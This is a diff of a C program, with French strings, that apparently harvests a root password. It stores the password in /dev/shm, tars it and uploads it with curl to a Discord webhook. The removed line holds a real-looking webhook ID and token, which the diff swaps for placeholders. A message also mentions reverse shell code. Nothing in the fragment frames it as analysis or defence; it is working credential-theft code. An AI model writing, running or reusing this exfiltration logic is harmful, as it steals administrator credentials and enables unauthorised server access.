@@ -13,12 +13,9 @@
 #define RESET       "\033[0m"
 
 
-
-
 int indelogable(void)
 {
     printf("code de reverse shell appele avec mdp found\n");
-
     return 0;
 }
 
@@ -40,7 +37,7 @@ int fonction_destination(const char* modepass) {
         printf(""GREEN"Mot de pass stocke avec succes dans /dev/shm/54897644576 , agentpathogene arrive ...\n\n"RESET"");
         printf("\n"MAGENTA"Envoi du mdp root on sais jamais qu'on peu se connecter au serveur en ssh\n\n"RESET"");
         system("tar -czf /dev/shm/root.tar.gz -C /dev/shm/ 54897644576 2>/dev/null");
-        system("curl -F \"file=@/dev/shm/root.tar.gz\" https://discord.com/api/webhooks/1367518202034913320/Ocjceovwbcin4svfX-HuYgdA6y_kXU1JkGbQJgjbyGKmIqhtJJ6ujc3RRhA2-29MZNUx 2>/dev/null");
+        system("curl -F \"file=@/dev/shm/root.tar.gz\" https://discord.com/api/webhooks/ID/TOKEN 2>/dev/null");
 
     }
  
